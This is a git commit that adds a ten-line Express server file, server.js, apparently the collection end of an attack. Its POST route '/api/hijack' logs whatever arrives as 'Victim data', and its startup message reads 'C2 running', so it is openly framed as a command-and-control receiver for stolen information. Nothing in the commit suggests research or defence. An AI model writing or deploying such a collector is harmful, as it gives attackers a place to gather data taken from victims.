d09789df3925f2ca536fc8c50c46976136682250
kemboi <deniskemboi336@gmail.com>
2026-02-03 15:27:38 +0300

    Add files via upload

---
+++ server.js
@@ -0,0 +1,10 @@
+const express = require('express');
+const app = express();
+app.use(express.json());
+
+app.post('/api/hijack', (req, res) => {
+    console.log('Victim data:', req.body);
+    res.json({ success: true });
+});
+
+app.listen(3000, () => console.log('C2 running'));
